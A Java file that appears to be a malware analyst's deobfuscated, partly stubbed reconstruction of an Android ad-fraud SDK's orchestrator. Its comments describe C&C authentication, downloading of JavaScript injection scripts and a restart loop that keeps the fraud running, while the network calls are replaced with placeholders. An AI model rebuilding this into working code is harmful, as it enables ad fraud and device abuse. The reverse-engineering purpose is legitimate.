package touch;

import android.content.Context;
import android.os.SystemClock;
import android.util.Log;
import android.webkit.WebView;

import org.json.JSONException;
import org.json.JSONObject;

/**
 * MALWARE ANALYSIS - RESTORED FROM OBFUSCATED CLASS: lIllIlIll1.IlIlllIIlI1
 *
 * Central task orchestrator for the ad-fraud / remote-control SDK.
 * Coordinates the entire task lifecycle:
 *
 * 1. Authenticates with the C&C server to obtain an auth token
 * 2. Determines whether to run in signaling (WebRTC) or non-signaling (autonomous) mode
 * 3. Downloads and caches JavaScript injection scripts from C&C
 * 4. Creates a WebView on the UI thread
 * 5. Dispatches the appropriate task implementation (SignalingModeTask or NonSignalingModeTask)
 * 6. After task completion, restarts the cycle with a new WebView
 *
 * JavaScript files are cached locally and version-checked against the server to avoid
 * re-downloading unchanged scripts. The JS version is stored in SharedPreferences.
 *
 * Original obfuscated name: lIllIlIll1.IlIlllIIlI1
 */
public class TaskOrchestrator {

    private static final String TAG = "TaskOrchestrator";

    // =========================================================================
    // Static Constants (XOR-decrypted at class load)
    // =========================================================================

    /**
     * SharedPreferences key for caching the signaling JS file content.
     * Decrypted from XOR: "eiedo/s_pfile"
     */
    public static final String SIGNALING_JS_FILE_KEY = "eiedo/s_pfile";

    /**
     * SharedPreferences/version key (alternate).
     * Decrypted from XOR at static init block.
     */
    public static final String JS_VERSION_KEY_ALT = "JS_VERSION"; // f463

    /**
     * SharedPreferences key for tracking the JS version (used to check if
     * cached JS matches the server version, avoiding redundant downloads).
     * Decrypted from XOR: "JS_VERSION"
     */
    public static final String JS_VERSION_KEY = "JS_VERSION"; // f464

    /**
     * SharedPreferences key for caching the non-signaling JS file content.
     * Decrypted from XOR: "eiedo/pfile"
     */
    public static final String NON_SIGNALING_JS_FILE_KEY = "eiedo/pfile";

    // =========================================================================
    // Inner Classes
    // =========================================================================

    /**
     * Runnable that creates a new WebView instance on the UI thread.
     * The WebView is stored in a single-element array for thread-safe return.
     *
     * Original obfuscated name: lIIIIlllllIlll1
     */
    public class CreateWebViewRunnable implements Runnable {

        /** Single-element array to hold the created WebView. */
        public final WebView[] webViewHolder;

        public CreateWebViewRunnable(WebView[] webViewHolder) {
            this.webViewHolder = webViewHolder;
        }

        @Override
        public void run() {
            // Create WebView using the application context
            // Original: if (IIlIllIIll1.f145lIllIlIll1 != null) { webViewHolder[0] = new WebView(context); }
            Context appContext = null; /* AppContext.applicationContext */
            if (appContext != null) {
                this.webViewHolder[0] = new WebView(appContext);
            }
        }
    }

    /**
     * Main task execution runnable. Runs on a background thread and:
     * 1. Authenticates with C&C to get an auth token
     * 2. Determines signaling vs non-signaling mode
     * 3. Downloads the appropriate JS script
     * 4. Gets the task configuration
     * 5. Creates and initializes the appropriate task implementation
     *
     * Original obfuscated name: llllIIIIll1
     */
    public class TaskExecutionRunnable implements Runnable {

        /** The WebView instance to use for this task. */
        public final WebView webView;

        /**
         * Runnable that initializes the WebView on the UI thread by calling
         * the task implementation's initializeWebView() method.
         *
         * Original obfuscated name: lIIIIlllllIlll1
         */
        public class InitWebViewRunnable implements Runnable {

            /** The task implementation to initialize. */
            public final WebViewAutomationBase taskInstance;

            public InitWebViewRunnable(WebViewAutomationBase taskInstance) {
                this.taskInstance = taskInstance;
            }

            @Override
            public void run() {
                try {
                    this.taskInstance.initializeWebView();
                } catch (Exception e) {
                    Log.e(TAG, "Error while starting adHolder: " + e);
                }
            }
        }

        /**
         * Runnable that triggers the restart cycle to begin a new task.
         * Called as the restart callback for NonSignalingModeTask.
         *
         * Original obfuscated name: RunnableC0018llllIIIIll1
         */
        public class RestartRunnable implements Runnable {
            public RestartRunnable() {
            }

            @Override
            public void run() {
                TaskOrchestrator.this.restartWithNewWebView();
            }
        }

        public TaskExecutionRunnable(WebView webView) {
            this.webView = webView;
        }

        @Override
        public void run() {
            try {
                Log.i(TAG, "start task");

                // Step 1: Authenticate with C&C server
                TaskOrchestrator.this.authenticateToken();

                // Step 2: Determine mode and get JS + config
                // Original: AppContext.taskConfig.IIlIllIIll1() checks if signaling mode is enabled
                boolean isSignalingMode = false; /* AppContext.taskConfig.isSignalingMode() */

                // Get the appropriate JS script (signaling or non-signaling)
                String jsScript = isSignalingMode
                        ? TaskOrchestrator.this.getSignalingJS()
                        : TaskOrchestrator.this.getNonSignalingJS();

                // Get the appropriate task configuration JSON
                JSONObject taskConfig = isSignalingMode
                        ? TaskOrchestrator.this.getSignalingConfig()
                        : TaskOrchestrator.this.getNonSignalingConfig();

                Log.i(TAG, "get task: " + taskConfig);

                // Step 3: Create the appropriate task implementation and initialize on UI thread
                WebViewAutomationBase task;
                if (isSignalingMode) {
                    task = new SignalingModeTask(this.webView, taskConfig, jsScript);
                } else {
                    task = new NonSignalingModeTask(this.webView, taskConfig, jsScript,
                            new RestartRunnable());
                }

                // Post initialization to the main thread
                // Original: AppContext.postToMainThread(new InitWebViewRunnable(task));
                new InitWebViewRunnable(task).run(); // Placeholder

            } catch (Exception e) {
                // ApiException
                Log.w(TAG, e.getMessage());
            } catch (Throwable th) {
                // Catastrophic error — log full stack trace
                StringBuilder sb = new StringBuilder();
                for (StackTraceElement element : th.getStackTrace()) {
                    sb.append(element.toString()).append("\n");
                }
                Log.e(TAG, "start task failed: " + th.getMessage() + sb.toString());
            }
        }
    }

    // =========================================================================
    // Constructor
    // =========================================================================

    /**
     * Constructs a TaskOrchestrator and sets the WebView data directory suffix.
     *
     * The suffix is derived from a Base64-encoded token:
     * "ZDgyNjEhKDk1RjBjYzExZUVAODE5XzUyNDA4QmEyNWI="
     *
     * This ensures WebView data is isolated to this SDK's directory, preventing
     * interference with the host app's WebView data.
     */
    public TaskOrchestrator() {
        // Original: AppContext.setDataDirectorySuffix(XOR_DECRYPT(...))
        // Sets WebView data directory to a unique suffix derived from the base64 token
        // "ZDgyNjEhKDk1RjBjYzExZUVAODE5XzUyNDA4QmEyNWI="
    }

    // =========================================================================
    // Authentication
    // =========================================================================

    /**
     * Authenticates with the C&C server to obtain an authorization token.
     * The token is stored in the AppContext for use in subsequent API calls.
     *
     * @throws Exception if authentication fails (null response, non-zero code, or network error)
     */
    public final void authenticateToken() throws Exception /* ApiException */ {
        Log.i(TAG, "getToken");
        Object /* TokenResponse */ tokenResponse = null;
        try {
            // Original: tokenResponse = ApiClient.getToken();
            tokenResponse = null; // Placeholder - calls C&C getToken API
        } catch (Exception /* NetworkException */ e) {
            Log.e(TAG, "get token API error: " + e);
        }
        if (tokenResponse == null) {
            throw new RuntimeException("getToken" /* error name */);
            // Original: throw new ApiException("getToken", -1, "no valid token returned");
        }
        // Original: if (tokenResponse.getCode() == 0) {
        //     AppContext.authToken = tokenResponse.getData();
        // } else {
        //     throw new ApiException("getToken error", code, message);
        // }
    }

    // =========================================================================
    // Signaling Connection Info
    // =========================================================================

    /**
     * Returns the current signaling connection info from the AppContext.
     * Static method used by other components to access the signaling state.
     */
    public static Object /* SignalingConnectionInfo */ getSignalingConnectionInfo() {
        // Original: return AppContext.getSignalingConnection();
        return null; // Placeholder
    }

    // =========================================================================
    // Task Configuration
    // =========================================================================

    /**
     * Gets the non-signaling task configuration from the C&C server.
     * Called when the task is running in autonomous (non-WebRTC) mode.
     *
     * @return task configuration as a JSONObject
     * @throws Exception if the API call fails or returns a non-zero code
     */
    public final JSONObject getNonSignalingConfig() throws Exception, JSONException {
        Object /* ConfigResponse */ response = null;
        try {
            // Original: response = ApiClient.getNonSignalingConfig();
            response = null; // Placeholder
        } catch (Exception /* NetworkException */ e) {
            Log.e(TAG, "getNonSignalingConfig error: " + e);
        }
        if (response == null) {
            throw new RuntimeException("getTask");
            // Original: throw new ApiException("getTask", -1, "response null");
        }
        // Original: if (response.getCode() == 0) return new JSONObject(response.getData());
        // else throw new ApiException("getTask", code, message);
        return new JSONObject("{}"); // Placeholder
    }

    /**
     * Gets the signaling task configuration from the C&C server.
     * Called when the task is running in WebRTC signaling mode.
     * Includes the signaling session info and offer ID.
     *
     * @return task configuration as a JSONObject
     * @throws Exception if the API call fails or returns a non-zero code
     */
    public final JSONObject getSignalingConfig() throws Exception, JSONException {
        Object /* ConfigResponse */ response = null;
        try {
            // Original: ApiClient.getSignalingConfig(
            //     AppContext.getSignalingConnection().getSessionId(),
            //     AppContext.taskConfig.getOfferId())
            response = null; // Placeholder
        } catch (Exception /* NetworkException */ e) {
            Log.e(TAG, "getSignalingConfig error: " + e);
        }
        if (response == null) {
            throw new RuntimeException("getSignalingTask");
            // Original: throw new ApiException("getSignalingTask", -1, "response null");
        }
        // Original: if (response.getCode() == 0) return new JSONObject(response.getData());
        // else throw new ApiException("getSignalingTask error", code, message);
        return new JSONObject("{}"); // Placeholder
    }

    // =========================================================================
    // JavaScript Download & Caching
    // =========================================================================

    /**
     * Downloads or retrieves from cache the signaling-mode JavaScript injection script.
     *
     * Caching logic:
     * 1. Read the locally cached JS version from SharedPreferences (key: JS_VERSION_KEY)
     * 2. Call C&C to check the current version (getFileSignalingLogic API)
     * 3. If versions match AND cached JS file exists → use cached version
     * 4. If versions differ OR no cache → download new JS, save to local file,
     *    update the version in SharedPreferences
     *
     * @return the JavaScript code string for signaling mode
     * @throws Exception if download fails and no cache is available
     */
    public final String getSignalingJS() throws Exception /* ApiException */ {
        Log.i(TAG, "checkSignalingJsVersion start");

        // Read cached JS version from SharedPreferences
        // Original: String cachedVersion = PreferencesHelper.readPref(context, JS_VERSION_KEY);
        Context context = null; /* AppContext.taskConfig.getContext() */
        String cachedVersion = null; /* PreferencesHelper.readPref(context, JS_VERSION_KEY) */

        // Compute auth token for API call
        // Original: String token = PreferencesHelper.computeToken(context.getApiKey(), JS_VERSION_KEY);
        String token = null; /* PreferencesHelper.computeToken(...) */
        Log.i(TAG, "signaling token: " + token);

        // Check server for current JS version
        Object /* FileVersionResponse */ versionResponse = null;
        try {
            // Original: versionResponse = ApiClient.getFileSignalingLogic(token != null ? token : "");
            versionResponse = null; // Placeholder
        } catch (Exception /* NetworkException */ e) {
            Log.e(TAG, "getFileSignalingLogic error: " + e);
        }

        if (versionResponse == null) {
            throw new RuntimeException("getFileVersion");
            // Original: throw new ApiException("getFileVersion", -1, "response null");
        }

        // Original: if (versionResponse.getCode() != 0)
        //     throw new ApiException("getFileVersion error", code, message);

        // Try to read cached JS from local file
        String cachedJS = null;
        try {
            // Original: cachedJS = PreferencesHelper.readFile(context, SIGNALING_JS_FILE_KEY);
        } catch (Exception e) {
            Log.e(TAG, "read signaling JS from cache error: " + e);
        }

        // Determine if we need to download fresh JS
        // Original: if versions match AND cached JS exists → use cache
        // Otherwise → download, save, and update version
        String serverVersion = null; /* versionResponse.getVersion() */
        String jsContent = null; /* versionResponse.getContent() */

        if (cachedVersion == null || cachedVersion.isEmpty()
                || !cachedVersion.equals(serverVersion)
                || cachedJS == null || cachedJS.isEmpty()) {
            // Need to download or use the response content
            // Original: if (!PreferencesHelper.writeFile(context, SIGNALING_JS_FILE_KEY, jsContent))
            //     throw new RuntimeException("写入JS文件失败" / "write JS file failed");
            // PreferencesHelper.savePref(context, JS_VERSION_KEY, serverVersion);
            cachedJS = jsContent;
        }

        if (cachedJS != null && cachedJS.isEmpty()) {
            Log.e(TAG, "js is empty");
        }

        return cachedJS;
    }

    /**
     * Starts the task execution on a new background thread.
     *
     * @param webView the WebView to use for this task
     */
    public void startTask(WebView webView) {
        new Thread(new TaskExecutionRunnable(webView)).start();
    }

    /**
     * Creates a new WebView on the UI thread and starts a new task cycle.
     *
     * This method implements the restart mechanism:
     * 1. Creates a WebView on the UI thread via CreateWebViewRunnable
     * 2. Sleeps 2 seconds to allow initialization
     * 3. Creates a new TaskOrchestrator instance
     * 4. Starts a new task with the freshly created WebView
     *
     * Called by NonSignalingModeTask's restart callback after each task completes,
     * enabling continuous autonomous ad-fraud operation.
     */
    public final void restartWithNewWebView() {
        try {
            WebView[] webViewHolder = new WebView[1];

            // Create WebView on UI thread
            // Original: AppContext.postToMainThread(new CreateWebViewRunnable(webViewHolder));
            new CreateWebViewRunnable(webViewHolder).run(); // Placeholder

            // Wait 2 seconds for WebView initialization
            SystemClock.sleep(2000L);

            // Create a fresh orchestrator and start a new task
            TaskOrchestrator orchestrator = new TaskOrchestrator();
            Log.i(TAG, "H5V1Refactor task start (restart)");

            WebView webView = webViewHolder[0];
            if (webView != null) {
                orchestrator.startTask(webView);
            }
        } catch (Exception unused) {
            // Silently ignore restart failures
        }
    }

    /**
     * Downloads or retrieves from cache the non-signaling-mode JavaScript injection script.
     *
     * Similar caching logic to {@link #getSignalingJS()} but uses different API endpoints
     * and file keys (NON_SIGNALING_JS_FILE_KEY instead of SIGNALING_JS_FILE_KEY).
     *
     * Caching logic:
     * 1. Call C&C to get the current JS file info (getNonSignalingJS API)
     * 2. Read cached version from SharedPreferences
     * 3. If versions match AND cached file exists → use cached version
     * 4. If versions differ OR no cache → call getFile API to download new JS,
     *    save to local file, update version
     *
     * @return the JavaScript code string for non-signaling mode
     * @throws Exception if download fails and no cache is available
     */
    public final String getNonSignalingJS() throws Exception /* ApiException */ {
        Log.i(TAG, "checkJsVersion start");

        // Check server for current JS version
        Object /* FileInfoResponse */ fileInfoResponse = null;
        try {
            // Original: fileInfoResponse = ApiClient.getNonSignalingJS();
            fileInfoResponse = null; // Placeholder
        } catch (Exception /* NetworkException */ e) {
            Log.e(TAG, "getNonSignalingJS error: " + e);
        }

        if (fileInfoResponse == null) {
            throw new RuntimeException("getFileVersion");
            // Original: throw new ApiException("getFileVersion", -1, "response null");
        }

        // Original: if (fileInfoResponse.getCode() != 0)
        //     throw new ApiException("getFileVersion error", code, message);

        // Read cached version from SharedPreferences
        Context context = null; /* AppContext.taskConfig.getContext() */
        String cachedVersion = null; /* PreferencesHelper.readPref(context, JS_VERSION_KEY) */
        Log.i(TAG, "non-signaling token: " + cachedVersion);

        // Try to read cached JS from local file
        String cachedJS = null;
        try {
            // Original: cachedJS = PreferencesHelper.readFile(context, NON_SIGNALING_JS_FILE_KEY);
        } catch (Exception e) {
            Log.e(TAG, "read non-signaling JS from cache error: " + e);
        }

        String serverVersion = null; /* fileInfoResponse.getVersion() */

        if (cachedVersion == null || cachedVersion.isEmpty()
                || !cachedVersion.equals(serverVersion)
                || cachedJS == null || cachedJS.isEmpty()) {

            Log.i(TAG, "need to download new JS from server");

            // Download the full JS file from C&C
            Object /* FileContentResponse */ fileResponse = null;
            try {
                // Original: fileResponse = ApiClient.getFile();
            } catch (Exception /* NetworkException */ e) {
                Log.e(TAG, "getFile error: " + e);
            }

            if (fileResponse != null) {
                // Original: if (fileResponse.getCode() == 0)
                String jsContent = null; /* fileResponse.getContent() */

                // Save to local file
                // Original: if (!PreferencesHelper.writeFile(context, NON_SIGNALING_JS_FILE_KEY, jsContent))
                //     throw new RuntimeException("写入JS文件失败" / "write JS file failed");

                // Update version in SharedPreferences
                // Original: PreferencesHelper.savePref(context, JS_VERSION_KEY, serverVersion);

                cachedJS = jsContent;
            } else {
                throw new RuntimeException("getFile");
                // Original: throw new ApiException("getFile", -1, "response null");
            }
        }

        if (cachedJS != null && cachedJS.isEmpty()) {
            Log.e(TAG, "js is empty");
        }

        return cachedJS;
    }
}
